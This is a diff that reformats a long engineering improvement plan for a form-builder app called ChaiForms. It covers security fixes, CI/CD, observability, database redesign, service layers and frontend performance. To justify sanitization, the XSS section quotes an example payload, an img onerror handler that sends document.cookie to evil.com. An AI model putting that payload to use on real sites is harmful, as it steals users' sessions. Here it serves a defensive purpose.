@@ -27,11 +27,13 @@ This document outlines all critical improvements needed to transform ChaiForms f
 ### 🚨 SEVERITY: HIGH — Form Password Brute Force Vulnerability
 
 **Current State:**
+
 - `/forms/slug/{slug}/unlock` endpoint has NO rate limiting
 - Attackers can brute force 4-character passwords in minutes
 - Demo password "demo1234" is weak and documented publicly
 
 **Why This Matters:**
+
 - Password-protected forms are a core feature for sensitive data collection
 - Breach could expose confidential survey responses, HR data, medical forms
 - Legal liability if customer data is compromised
@@ -39,6 +41,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
 **Implementation Steps:**
 
 1. **Add rate limiting to unlock endpoint**
+
    ```typescript
    // packages/trpc/server/utils/unlock-rate-limiter.ts
    import { Ratelimit } from "@upstash/ratelimit";
@@ -65,6 +68,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
    ```
 
 2. **Update unlock procedure**
+
    ```typescript
    // packages/trpc/server/routes/forms/route.ts
    unlock: publicProcedure
@@ -72,15 +76,16 @@ This document outlines all critical improvements needed to transform ChaiForms f
      .mutation(async ({ input, ctx }) => {
        const ip = getClientIp(ctx.req) ?? "unknown";
        const rateLimitKey = `${ip}:${input.slug}`;
-       
+
        // Rate limit BEFORE checking password
        await assertUnlockRateLimit(rateLimitKey);
-       
+
        // ... rest of unlock logic
      }),
    ```
 
 3. **Increase minimum password length**
+
    ```typescript
    // packages/schemas/src/form-settings.ts
    accessPassword: z.string().min(8).nullable().optional(), // was min(4)
@@ -92,13 +97,14 @@ This document outlines all critical improvements needed to transform ChaiForms f
    accessPassword: z
      .string()
      .min(8)
-     .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/, 
+     .regex(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/,
        "Password must contain uppercase, lowercase, and number")
      .nullable()
      .optional(),
    ```
 
 **Acceptance Criteria:**
+
 - [ ] Unlock endpoint limited to 5 attempts per hour per IP+slug
 - [ ] Minimum password length increased to 8 characters
 - [ ] Password strength requirements enforced
@@ -113,11 +119,13 @@ This document outlines all critical improvements needed to transform ChaiForms f
 ### 🚨 SEVERITY: MEDIUM — XSS in Form Titles and Descriptions
 
 **Current State:**
+
 - Form titles and descriptions are not sanitized
 - Rendered directly in React components without escaping
 - Stored XSS vulnerability allows attackers to inject malicious scripts
 
 **Why This Matters:**
+
 - Attacker creates form with title: `<img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)">`
 - When creator views dashboard, session cookie is stolen
 - Attacker gains full account access
@@ -125,6 +133,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
 **Implementation Steps:**
 
 1. **Install DOMPurify**
+
    ```bash
    cd apps/web
    pnpm add dompurify
@@ -132,6 +141,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
    ```
 
 2. **Create sanitization utility**
+
    ```typescript
    // apps/web/lib/sanitize.ts
    import DOMPurify from "dompurify";
@@ -150,6 +160,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
    ```
 
 3. **Sanitize on display**
+
    ```typescript
    // apps/web/app/dashboard/forms/[id]/page.tsx
    import { sanitizeText } from "~/lib/sanitize";
@@ -159,12 +170,13 @@ This document outlines all critical improvements needed to transform ChaiForms f
    ```
 
 4. **Add server-side validation**
+
    ```typescript
    // packages/trpc/server/routes/forms/route.ts
    import { sanitizeText } from "./utils/sanitize";
 
    create: protectedProcedure
-     .input(z.object({ 
+     .input(z.object({
        title: z.string().min(1).max(255).transform(sanitizeText)
      }))
      .mutation(async ({ input, ctx }) => {
@@ -172,8 +184,8 @@ This document outlines all critical improvements needed to transform ChaiForms f
      }),
    ```
 
-
 **Acceptance Criteria:**
+
 - [ ] All user-generated content sanitized before display
 - [ ] Server-side validation strips dangerous HTML
 - [ ] XSS test suite passes (OWASP ZAP scan)
@@ -187,6 +199,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
 ### 🚨 SEVERITY: MEDIUM — CSRF Token Reuse
 
 **Current State:**
+
 - CSRF tokens don't expire
 - Same token can be reused indefinitely
 - Weakens CSRF protection
@@ -194,6 +207,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
 **Implementation Steps:**
 
 1. **Add expiry to CSRF tokens**
+
    ```typescript
    // packages/trpc/server/utils/csrf.ts
    import jwt from "jsonwebtoken";
@@ -202,7 +216,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
      return jwt.sign(
        { purpose: "csrf", nonce: randomUUID() },
        getCsrfSecret(),
-       { expiresIn: "1h" } // Add expiry
+       { expiresIn: "1h" }, // Add expiry
      );
    }
 
@@ -230,6 +244,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
    ```
 
 **Acceptance Criteria:**
+
 - [ ] CSRF tokens expire after 1 hour
 - [ ] Expired tokens rejected with clear error
 - [ ] New token issued on each response
@@ -246,6 +261,7 @@ This document outlines all critical improvements needed to transform ChaiForms f
 **Current State:** No CSP headers, allowing inline scripts and external resources
 
 **Implementation:**
+
 ```typescript
 // apps/api/src/server.ts
 import helmet from "helmet";
@@ -270,11 +286,12 @@ app.use(
       includeSubDomains: true,
       preload: true,
     },
-  })
+  }),
 );
 ```
 
 **Acceptance Criteria:**
+
 - [ ] CSP headers present on all responses
 - [ ] No CSP violations in browser console
 - [ ] HSTS enabled for HTTPS enforcement
@@ -288,6 +305,7 @@ app.use(
 **Current State:** Refresh tokens are long-lived (30 days) without rotation
 
 **Implementation:**
+
 ```typescript
 // packages/trpc/server/routes/auth/route.ts
 refresh: publicProcedure
@@ -314,7 +332,7 @@ refresh: publicProcedure
         .update(refreshTokensTable)
         .set({ revoked: true })
         .where(eq(refreshTokensTable.family, family));
-      
+
       throw new TRPCError({
         code: "UNAUTHORIZED",
         message: "Token reuse detected",
@@ -344,6 +362,7 @@ refresh: publicProcedure
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Refresh tokens rotated on each use
 - [ ] Token reuse detected and entire family revoked
 - [ ] Old tokens invalidated immediately
@@ -357,12 +376,14 @@ refresh: publicProcedure
 ### 🚨 CRITICAL: No CI/CD Pipeline
 
 **Current State:**
+
 - Manual deployments
 - No automated testing before deploy
 - No build verification
 - High risk of breaking production
 
 **Why This Matters:**
+
 - Manual deployments are error-prone
 - Can't scale team without automation
 - No rollback strategy
@@ -371,6 +392,7 @@ refresh: publicProcedure
 **Implementation Steps:**
 
 1. **Create GitHub Actions workflow**
+
    ```yaml
    # .github/workflows/ci.yml
    name: CI/CD Pipeline
@@ -384,7 +406,7 @@ refresh: publicProcedure
    jobs:
      test:
        runs-on: ubuntu-latest
-       
+
        services:
          postgres:
            image: postgres:15
@@ -401,31 +423,31 @@ refresh: publicProcedure
 
        steps:
          - uses: actions/checkout@v4
-         
+
          - uses: pnpm/action-setup@v2
            with:
              version: 9.0.0
-         
+
          - uses: actions/setup-node@v4
            with:
              node-version: 18
-             cache: 'pnpm'
-         
+             cache: "pnpm"
+
          - name: Install dependencies
            run: pnpm install --frozen-lockfile
-         
+
          - name: Run linter
            run: pnpm lint
-         
+
          - name: Type check
            run: pnpm check-types
-         
+
          - name: Run tests
            run: pnpm test
            env:
              DATABASE_URL: postgresql://postgres:postgres@localhost:5432/chaiforms_test
              JWT_SECRET: test-secret-min-32-characters-long
-         
+
          - name: Build all packages
            run: pnpm build
 
@@ -453,6 +475,7 @@ refresh: publicProcedure
    ```
 
 2. **Add pre-commit hooks**
+
    ```bash
    pnpm add -D husky lint-staged
    npx husky init
@@ -462,13 +485,8 @@ refresh: publicProcedure
    // package.json
    {
      "lint-staged": {
-       "*.{ts,tsx}": [
-         "eslint --fix",
-         "prettier --write"
-       ],
-       "*.{json,md}": [
-         "prettier --write"
-       ]
+       "*.{ts,tsx}": ["eslint --fix", "prettier --write"],
+       "*.{json,md}": ["prettier --write"]
      }
    }
    ```
@@ -479,13 +497,13 @@ refresh: publicProcedure
    pnpm check-types
    ```
 
-
 3. **Add deployment configuration**
+
    ```dockerfile
    # apps/api/Dockerfile
    FROM node:18-alpine AS base
    RUN corepack enable && corepack prepare pnpm@9.0.0 --activate
-   
+
    FROM base AS deps
    WORKDIR /app
    COPY package.json pnpm-lock.yaml pnpm-workspace.yaml ./
@@ -496,29 +514,29 @@ refresh: publicProcedure
    COPY packages/services/package.json ./packages/services/
    COPY apps/api/package.json ./apps/api/
    RUN pnpm install --frozen-lockfile --filter @repo/api...
-   
+
    FROM base AS builder
    WORKDIR /app
    COPY --from=deps /app/node_modules ./node_modules
    COPY . .
    RUN pnpm turbo build --filter @repo/api
-   
+
    FROM base AS runner
    WORKDIR /app
    ENV NODE_ENV=production
-   
+
    COPY --from=builder /app/apps/api/dist ./dist
    COPY --from=builder /app/node_modules ./node_modules
    COPY --from=builder /app/packages ./packages
-   
+
    EXPOSE 8000
    CMD ["node", "dist/index.js"]
    ```
 
    ```yaml
    # docker-compose.yml
-   version: '3.8'
-   
+   version: "3.8"
+
    services:
      postgres:
        image: postgres:15-alpine
@@ -530,12 +548,12 @@ refresh: publicProcedure
          - "5432:5432"
        volumes:
          - postgres_data:/var/lib/postgresql/data
-     
+
      redis:
        image: redis:7-alpine
        ports:
          - "6379:6379"
-     
+
      api:
        build:
          context: .
@@ -548,12 +566,13 @@ refresh: publicProcedure
        depends_on:
          - postgres
          - redis
-   
+
    volumes:
      postgres_data:
    ```
 
 **Acceptance Criteria:**
+
 - [ ] CI runs on every PR and push to main
 - [ ] All tests must pass before merge
 - [ ] Automated deployment to staging on merge to develop
@@ -569,6 +588,7 @@ refresh: publicProcedure
 ### 🚨 CRITICAL: No Observability
 
 **Current State:**
+
 - No structured logging
 - No error tracking
 - No performance monitoring
@@ -577,6 +597,7 @@ refresh: publicProcedure
 **Implementation Steps:**
 
 1. **Add Sentry for error tracking**
+
    ```bash
    pnpm add @sentry/node @sentry/nextjs
    ```
@@ -611,6 +632,7 @@ refresh: publicProcedure
    ```
 
 2. **Implement structured logging**
+
    ```typescript
    // packages/logger/index.ts
    import pino from "pino";
@@ -641,6 +663,7 @@ refresh: publicProcedure
    ```
 
 3. **Add request correlation IDs**
+
    ```typescript
    // apps/api/src/middleware/correlation-id.ts
    import { randomUUID } from "crypto";
@@ -649,15 +672,16 @@ refresh: publicProcedure
      const correlationId = req.headers["x-correlation-id"] || randomUUID();
      req.correlationId = correlationId;
      res.setHeader("x-correlation-id", correlationId);
-     
+
      // Add to logger context
      req.log = logger.child({ correlationId });
-     
+
      next();
    }
    ```
 
 4. **Add Prometheus metrics**
+
    ```typescript
    // apps/api/src/metrics.ts
    import promClient from "prom-client";
@@ -705,6 +729,7 @@ refresh: publicProcedure
    ```
 
 **Acceptance Criteria:**
+
 - [ ] All errors sent to Sentry with context
 - [ ] Structured logs with correlation IDs
 - [ ] Prometheus metrics exposed at `/metrics`
@@ -721,6 +746,7 @@ refresh: publicProcedure
 **Current State:** `/health` endpoint returns static JSON
 
 **Implementation:**
+
 ```typescript
 // apps/api/src/server.ts
 app.get("/health", async (req, res) => {
@@ -763,6 +789,7 @@ app.get("/health", async (req, res) => {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Health check verifies database connectivity
 - [ ] Health check verifies Redis connectivity (if configured)
 - [ ] Returns 503 if any critical service is down
@@ -777,12 +804,14 @@ app.get("/health", async (req, res) => {
 ### 🐌 PERFORMANCE: Answers Table is EAV Anti-Pattern
 
 **Current State:**
+
 - Answers stored as `(responseId, fieldId, value TEXT)`
 - All data types (numbers, dates, arrays) stringified
 - Analytics queries require full table scans
 - No type safety at database level
 
 **Why This Matters:**
+
 - At 1M responses with 10 fields each = 10M rows in answers table
 - Query: "Get average rating for field X" requires parsing TEXT to numbers
 - No indexes on values (can't index TEXT efficiently)
@@ -791,6 +820,7 @@ app.get("/health", async (req, res) => {
 **Implementation Steps:**
 
 1. **Create new answers table schema**
+
    ```typescript
    // packages/database/models/answer-v2.ts
    export const answersV2Table = pgTable(
@@ -801,33 +831,36 @@ app.get("/health", async (req, res) => {
          .notNull()
          .references(() => responsesTable.id, { onDelete: "cascade" }),
        fieldId: uuid("field_id").notNull(),
-       
+
        // Type-specific columns
        valueText: text("value_text"),
        valueNumber: doublePrecision("value_number"),
        valueDate: timestamp("value_date"),
        valueBoolean: boolean("value_boolean"),
        valueJson: jsonb("value_json"), // For arrays, objects
-       
+
        createdAt: timestamp("created_at").defaultNow(),
      },
      (t) => [
        index("answers_v2_response_id_idx").on(t.responseId),
        index("answers_v2_field_id_idx").on(t.fieldId),
-       
+
        // Partial indexes for efficient filtering
-       index("answers_v2_text_idx").on(t.fieldId, t.valueText)
+       index("answers_v2_text_idx")
+         .on(t.fieldId, t.valueText)
          .where(sql`value_text IS NOT NULL`),
-       index("answers_v2_number_idx").on(t.fieldId, t.valueNumber)
+       index("answers_v2_number_idx")
+         .on(t.fieldId, t.valueNumber)
          .where(sql`value_number IS NOT NULL`),
-       index("answers_v2_date_idx").on(t.fieldId, t.valueDate)
+       index("answers_v2_date_idx")
+         .on(t.fieldId, t.valueDate)
          .where(sql`value_date IS NOT NULL`),
-     ]
+     ],
    );
    ```
 
-
 2. **Create migration script**
+
    ```typescript
    // packages/database/migrations/migrate-answers-to-v2.ts
    import { db } from "../index";
@@ -838,11 +871,7 @@ app.get("/health", async (req, res) => {
      let offset = 0;
 
      while (true) {
-       const answers = await db
-         .select()
-         .from(answersTable)
-         .limit(batchSize)
-         .offset(offset);
+       const answers = await db.select().from(answersTable).limit(batchSize).offset(offset);
 
        if (answers.length === 0) break;
 
@@ -901,6 +930,7 @@ app.get("/health", async (req, res) => {
    ```
 
 3. **Update response submission to use v2**
+
    ```typescript
    // packages/trpc/server/routes/responses/route.ts
    submit: publicProcedure
@@ -910,7 +940,7 @@ app.get("/health", async (req, res) => {
        // Insert answers with proper types
        const typedAnswers = input.answers.map((a) => {
          const field = fields.find((f) => f.id === a.fieldId);
-         
+
          switch (field?.type) {
            case "number":
            case "rating":
@@ -951,6 +981,7 @@ app.get("/health", async (req, res) => {
    ```
 
 **Acceptance Criteria:**
+
 - [ ] New answers_v2 table created with typed columns
 - [ ] Migration script successfully migrates existing data
 - [ ] All new submissions use answers_v2
@@ -967,33 +998,35 @@ app.get("/health", async (req, res) => {
 **Current State:** Only single-column indexes exist
 
 **Implementation:**
+
 ```sql
 -- packages/database/drizzle/0005_add_composite_indexes.sql
 
 -- Forms: Speed up dashboard queries
-CREATE INDEX forms_creator_status_visibility_idx 
-  ON forms(creator_id, status, visibility) 
+CREATE INDEX forms_creator_status_visibility_idx
+  ON forms(creator_id, status, visibility)
   WHERE deleted_at IS NULL;
 
 -- Responses: Speed up analytics queries
-CREATE INDEX responses_form_submitted_idx 
+CREATE INDEX responses_form_submitted_idx
   ON responses(form_id, submitted_at DESC);
 
 -- Responses: Speed up time-range queries
-CREATE INDEX responses_submitted_at_idx 
+CREATE INDEX responses_submitted_at_idx
   ON responses(submitted_at DESC);
 
 -- Workspace members: Speed up permission checks
-CREATE INDEX workspace_members_workspace_user_idx 
+CREATE INDEX workspace_members_workspace_user_idx
   ON workspace_members(workspace_id, user_id);
 
 -- Forms: Speed up public explore queries
-CREATE INDEX forms_public_explore_idx 
-  ON forms(status, visibility, created_at DESC) 
+CREATE INDEX forms_public_explore_idx
+  ON forms(status, visibility, created_at DESC)
   WHERE deleted_at IS NULL AND status = 'published' AND visibility = 'public';
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Dashboard loads 5x faster
 - [ ] Analytics queries use composite indexes (verify with EXPLAIN)
 - [ ] Public explore page loads instantly
@@ -1007,12 +1040,13 @@ CREATE INDEX forms_public_explore_idx
 **Current State:** Analytics queries join 3 tables on every request
 
 **Implementation:**
+
 ```sql
 -- packages/database/drizzle/0006_analytics_materialized_views.sql
 
 -- Materialized view for form summary stats
 CREATE MATERIALIZED VIEW form_summary_stats AS
-SELECT 
+SELECT
   f.id AS form_id,
   f.creator_id,
   COUNT(DISTINCT r.id) AS total_responses,
@@ -1029,7 +1063,7 @@ LEFT JOIN responses r ON r.form_id = f.id
 WHERE f.deleted_at IS NULL
 GROUP BY f.id, f.creator_id;
 
-CREATE UNIQUE INDEX form_summary_stats_form_id_idx 
+CREATE UNIQUE INDEX form_summary_stats_form_id_idx
   ON form_summary_stats(form_id);
 
 -- Refresh strategy: every 5 minutes via cron
@@ -1052,14 +1086,18 @@ export async function refreshAnalyticsMaterializedViews() {
 }
 
 // In index.ts
-setInterval(() => {
-  void refreshAnalyticsMaterializedViews().catch((err) => {
-    logger.error("Failed to refresh analytics views", { err });
-  });
-}, 5 * 60 * 1000); // Every 5 minutes
+setInterval(
+  () => {
+    void refreshAnalyticsMaterializedViews().catch((err) => {
+      logger.error("Failed to refresh analytics views", { err });
+    });
+  },
+  5 * 60 * 1000,
+); // Every 5 minutes
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Dashboard loads from materialized view (instant)
 - [ ] View refreshes every 5 minutes
 - [ ] Analytics are eventually consistent (acceptable tradeoff)
@@ -1073,6 +1111,7 @@ setInterval(() => {
 **Current State:** Single responses table will grow unbounded
 
 **Implementation:**
+
 ```sql
 -- packages/database/drizzle/0007_partition_responses.sql
 
@@ -1131,6 +1170,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Responses table partitioned by month
 - [ ] Old partitions can be archived/dropped
 - [ ] Query performance maintained as data grows
@@ -1148,6 +1188,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
 **Current State:** Business logic lives in tRPC procedures
 
 **Why This Matters:**
+
 - Can't reuse logic outside tRPC (e.g., background jobs, CLI tools)
 - Hard to test business logic in isolation
 - Violates single responsibility principle
@@ -1155,6 +1196,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
 **Implementation Steps:**
 
 1. **Create service layer structure**
+
    ```
    packages/services/
    ├── forms/
@@ -1172,6 +1214,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
    ```
 
 2. **Implement FormsService**
+
    ```typescript
    // packages/services/forms/forms.service.ts
    import { db, eq } from "@repo/database";
@@ -1181,7 +1224,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
    export class FormsService {
      async createForm(input: CreateFormInput) {
        const slug = await this.generateUniqueSlug();
-       
+
        const [form] = await db
          .insert(formsTable)
          .values({
@@ -1217,15 +1260,14 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
      }
 
      async deleteForm(formId: string) {
-       await db
-         .update(formsTable)
-         .set({ deletedAt: new Date() })
-         .where(eq(formsTable.id, formId));
+       await db.update(formsTable).set({ deletedAt: new Date() }).where(eq(formsTable.id, formId));
      }
 
      private async generateUniqueSlug(): Promise<string> {
        for (let i = 0; i < 10; i++) {
-         const slug = nanoid(12).toLowerCase().replace(/[^a-z0-9-]/g, "-");
+         const slug = nanoid(12)
+           .toLowerCase()
+           .replace(/[^a-z0-9-]/g, "-");
          const exists = await this.slugExists(slug);
          if (!exists) return slug;
        }
@@ -1261,8 +1303,8 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
    export const formsService = new FormsService();
    ```
 
-
 3. **Update tRPC procedures to use service**
+
    ```typescript
    // packages/trpc/server/routes/forms/route.ts
    import { formsService } from "@repo/services/forms";
@@ -1283,17 +1325,18 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
        .mutation(async ({ input, ctx }) => {
          // Authorization check
          await assertOwnership(input.formId, ctx.user.id);
-         
+
          // Delegate to service
          const { formId, ...settings } = input;
          const form = await formsService.updateForm(formId, settings);
-         
+
          return mapForm(form);
        }),
    });
    ```
 
 4. **Add unit tests for service**
+
    ```typescript
    // packages/services/forms/forms.service.test.ts
    import { describe, it, expect, beforeEach } from "vitest";
@@ -1341,7 +1384,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
          await expect(
            formsService.updateForm("form-123", {
              slug: "existing-slug",
-           })
+           }),
          ).rejects.toThrow("Slug already in use");
        });
      });
@@ -1349,6 +1392,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
    ```
 
 **Acceptance Criteria:**
+
 - [ ] All business logic extracted to service layer
 - [ ] Services are framework-agnostic (no tRPC dependencies)
 - [ ] 100% unit test coverage for services
@@ -1365,6 +1409,7 @@ setInterval(createNextMonthPartition, 30 * 24 * 60 * 60 * 1000);
 **Current State:** Raw Drizzle queries scattered across codebase
 
 **Implementation:**
+
 ```typescript
 // packages/database/repositories/forms.repository.ts
 import { db, eq, and, isNull, desc } from "../index";
@@ -1373,11 +1418,7 @@ import type { SelectForm, InsertForm } from "../models/form";
 
 export class FormsRepository {
   async findById(id: string): Promise<SelectForm | null> {
-    const [form] = await db
-      .select()
-      .from(formsTable)
-      .where(eq(formsTable.id, id))
-      .limit(1);
+    const [form] = await db.select().from(formsTable).where(eq(formsTable.id, id)).limit(1);
     return form || null;
   }
 
@@ -1385,22 +1426,17 @@ export class FormsRepository {
     const [form] = await db
       .select()
       .from(formsTable)
-      .where(
-        and(
-          eq(formsTable.slug, slug),
-          isNull(formsTable.deletedAt)
-        )
-      )
+      .where(and(eq(formsTable.slug, slug), isNull(formsTable.deletedAt)))
       .limit(1);
     return form || null;
   }
 
   async findByCreator(
     creatorId: string,
-    options: { includeDeleted?: boolean } = {}
+    options: { includeDeleted?: boolean } = {},
   ): Promise<SelectForm[]> {
     const conditions = [eq(formsTable.creatorId, creatorId)];
-    
+
     if (!options.includeDeleted) {
       conditions.push(isNull(formsTable.deletedAt));
     }
@@ -1413,45 +1449,28 @@ export class FormsRepository {
   }
 
   async create(data: InsertForm): Promise<SelectForm> {
-    const [form] = await db
-      .insert(formsTable)
-      .values(data)
-      .returning();
+    const [form] = await db.insert(formsTable).values(data).returning();
     return form!;
   }
 
   async update(id: string, data: Partial<InsertForm>): Promise<SelectForm> {
-    const [form] = await db
-      .update(formsTable)
-      .set(data)
-      .where(eq(formsTable.id, id))
-      .returning();
+    const [form] = await db.update(formsTable).set(data).where(eq(formsTable.id, id)).returning();
     return form!;
   }
 
   async softDelete(id: string): Promise<void> {
-    await db
-      .update(formsTable)
-      .set({ deletedAt: new Date() })
-      .where(eq(formsTable.id, id));
+    await db.update(formsTable).set({ deletedAt: new Date() }).where(eq(formsTable.id, id));
   }
 
   async hardDelete(id: string): Promise<void> {
-    await db
-      .delete(formsTable)
-      .where(eq(formsTable.id, id));
+    await db.delete(formsTable).where(eq(formsTable.id, id));
   }
 
   async countByCreator(creatorId: string): Promise<number> {
     const [result] = await db
       .select({ count: count() })
       .from(formsTable)
-      .where(
-        and(
-          eq(formsTable.creatorId, creatorId),
-          isNull(formsTable.deletedAt)
-        )
-      );
+      .where(and(eq(formsTable.creatorId, creatorId), isNull(formsTable.deletedAt)));
     return Number(result?.count ?? 0);
   }
 }
@@ -1460,6 +1479,7 @@ export const formsRepository = new FormsRepository();
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All database queries go through repositories
 - [ ] Repositories are testable with in-memory database
 - [ ] Complex queries encapsulated in repository methods
@@ -1474,14 +1494,13 @@ export const formsRepository = new FormsRepository();
 **Current State:** Manual transaction management
 
 **Implementation:**
+
 ```typescript
 // packages/database/transaction.ts
 import { db } from "./index";
 import type { PgTransaction } from "drizzle-orm/pg-core";
 
-export async function withTransaction<T>(
-  callback: (tx: PgTransaction) => Promise<T>
-): Promise<T> {
+export async function withTransaction<T>(callback: (tx: PgTransaction) => Promise<T>): Promise<T> {
   return db.transaction(async (tx) => {
     try {
       return await callback(tx);
@@ -1498,14 +1517,13 @@ export async function cloneFormWithPages(formId: string, userId: string) {
     // Clone form
     const [newForm] = await tx
       .insert(formsTable)
-      .values({ /* ... */ })
+      .values({
+        /* ... */
+      })
       .returning();
 
     // Clone pages
-    const pages = await tx
-      .select()
-      .from(pagesTable)
-      .where(eq(pagesTable.formId, formId));
+    const pages = await tx.select().from(pagesTable).where(eq(pagesTable.formId, formId));
 
     if (pages.length > 0) {
       await tx.insert(pagesTable).values(
@@ -1514,7 +1532,7 @@ export async function cloneFormWithPages(formId: string, userId: string) {
           title: p.title,
           order: p.order,
           fieldIds: p.fieldIds,
-        }))
+        })),
       );
     }
 
@@ -1524,6 +1542,7 @@ export async function cloneFormWithPages(formId: string, userId: string) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All multi-step operations use transactions
 - [ ] Automatic rollback on error
 - [ ] Nested transactions supported
@@ -1537,6 +1556,7 @@ export async function cloneFormWithPages(formId: string, userId: string) {
 **Current State:** `assertOwnership` duplicated across procedures
 
 **Implementation:**
+
 ```typescript
 // packages/trpc/server/middleware/ownership.ts
 import { TRPCError } from "@trpc/server";
@@ -1545,7 +1565,7 @@ import { formsRepository } from "@repo/database/repositories";
 export const formOwnershipMiddleware = tRPCContext.middleware(
   async ({ ctx, next, getRawInput }) => {
     const input = (await getRawInput()) as { formId?: string };
-    
+
     if (!input?.formId) {
       throw new TRPCError({
         code: "BAD_REQUEST",
@@ -1554,7 +1574,7 @@ export const formOwnershipMiddleware = tRPCContext.middleware(
     }
 
     const form = await formsRepository.findById(input.formId);
-    
+
     if (!form) {
       throw new TRPCError({
         code: "NOT_FOUND",
@@ -1575,12 +1595,10 @@ export const formOwnershipMiddleware = tRPCContext.middleware(
         form, // Pass form to procedure
       },
     });
-  }
+  },
 );
 
-export const formOwnerProcedure = protectedProcedure.use(
-  formOwnershipMiddleware
-);
+export const formOwnerProcedure = protectedProcedure.use(formOwnershipMiddleware);
 
 // Usage
 export const formsRouter = router({
@@ -1595,6 +1613,7 @@ export const formsRouter = router({
 ```
 
 **Acceptance Criteria:**
+
 - [ ] No duplicated ownership checks
 - [ ] Middleware reusable across routers
 - [ ] Form preloaded in context
@@ -1610,6 +1629,7 @@ export const formsRouter = router({
 **Current State:** Entire app in single bundle
 
 **Implementation:**
+
 ```typescript
 // apps/web/app/dashboard/forms/[id]/builder/page.tsx
 import dynamic from "next/dynamic";
@@ -1642,6 +1662,7 @@ export default function BuilderPage() {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Initial bundle < 200KB gzipped
 - [ ] Form builder lazy loaded
 - [ ] Analytics charts lazy loaded
@@ -1656,6 +1677,7 @@ export default function BuilderPage() {
 **Current State:** Only spinners for loading states
 
 **Implementation:**
+
 ```typescript
 // apps/web/components/skeletons/form-card-skeleton.tsx
 export function FormCardSkeleton() {
@@ -1695,6 +1717,7 @@ export default function DashboardPage() {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All loading states use skeletons
 - [ ] Skeletons match final content layout
 - [ ] No layout shift on load
@@ -1708,6 +1731,7 @@ export default function DashboardPage() {
 **Current State:** Images loaded without optimization
 
 **Implementation:**
+
 ```typescript
 // apps/web/app/page.tsx
 import Image from "next/image";
@@ -1733,6 +1757,7 @@ export default {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All images use next/image
 - [ ] AVIF/WebP formats served
 - [ ] Lazy loading for below-fold images
@@ -1747,6 +1772,7 @@ export default {
 **Current State:** Dashboard lags with 100+ forms
 
 **Implementation:**
+
 ```typescript
 // apps/web/components/dashboard/forms-list-virtualized.tsx
 import { useVirtualizer } from "@tanstack/react-virtual";
@@ -1795,6 +1821,7 @@ export function FormsListVirtualized({ forms }: { forms: Form[] }) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Dashboard renders 1000+ forms smoothly
 - [ ] Only visible items rendered
 - [ ] Scroll performance 60fps
@@ -1808,6 +1835,7 @@ export function FormsListVirtualized({ forms }: { forms: Form[] }) {
 **Current State:** Unhandled errors crash entire app
 
 **Implementation:**
+
 ```typescript
 // apps/web/components/error-boundary.tsx
 "use client";
@@ -1882,6 +1910,7 @@ export default function RootLayout({ children }) {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Error boundaries at route level
 - [ ] Errors sent to Sentry
 - [ ] User-friendly error messages
@@ -1891,7 +1920,6 @@ export default function RootLayout({ children }) {
 
 ---
 
-
 ## 6. Monorepo & Build Optimization (P2)
 
 ### 📦 Extract Shared UI Component Library
@@ -1899,6 +1927,7 @@ export default function RootLayout({ children }) {
 **Current State:** UI components scattered in `apps/web/components/ui`
 
 **Implementation:**
+
 ```bash
 # Create new package
 mkdir -p packages/ui
@@ -1970,6 +1999,7 @@ export const Destructive: Story = {
 ```
 
 **Acceptance Criteria:**
+
 - [ ] All UI components in `@repo/ui`
 - [ ] Storybook running at localhost:6006
 - [ ] All components documented
@@ -1984,6 +2014,7 @@ export const Destructive: Story = {
 **Current State:** All packages at version 1.0.0
 
 **Implementation:**
+
 ```bash
 pnpm add -D @changesets/cli
 pnpm changeset init
@@ -1999,7 +2030,7 @@ pnpm changeset init
   "access": "restricted",
   "baseBranch": "main",
   "updateInternalDependencies": "patch",
-  "ignore": []
+  "ignore": [],
 }
 ```
 
@@ -2020,6 +2051,7 @@ pnpm changeset publish
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Changesets configured
 - [ ] Version bumps automated
 - [ ] Changelog generated automatically
@@ -2034,6 +2066,7 @@ pnpm changeset publish
 **Current State:** Local caching only
 
 **Implementation:**
+
 ```bash
 # Sign up for Vercel (free tier includes Turbo cache)
 npx turbo login
@@ -2068,6 +2101,7 @@ npx turbo link
 ```
 
 **Acceptance Criteria:**
+
 - [ ] Remote cache enabled
 - [ ] CI builds use remote cache
 - [ ] Build times reduced by 50%+
@@ -2081,6 +2115,7 @@ npx turbo link
 **Current State:** Types scattered across packages
 
 **Implementation:**
+
 ```typescript
 // packages/types/src/index.ts
 export type FormId = string & { readonly __brand: "FormId" };
@@ -2109,12 +2144,11 @@ export interface PaginatedResponse<T> {
   hasMore: boolean;
 }
 
-export type Result<T, E = Error> =
